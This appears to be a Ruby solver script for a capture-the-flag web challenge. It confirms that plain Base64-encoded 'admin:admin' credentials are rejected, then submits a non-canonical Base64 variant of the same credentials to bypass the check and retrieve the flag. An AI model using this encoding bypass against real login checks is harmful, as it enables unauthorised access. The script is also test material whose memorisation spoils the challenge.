require 'base64'
require 'httparty'
require_relative 'libronsolve'

# Make sure the naive way doesn't work
result = HTTParty.post("#{ get_url() }/index.php?encoded_creds=#{ Base64.strict_encode64('admin:admin') }")
if result.include?('CTF') || !result.include?('AHA')
  puts "Something went wrong: the 'bad' request wasn't correctly handled!"
  exit(1)
end

result = HTTParty.post("#{ get_url() }/index.php?encoded_creds=YWRtaW46YWRtaW5=")

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
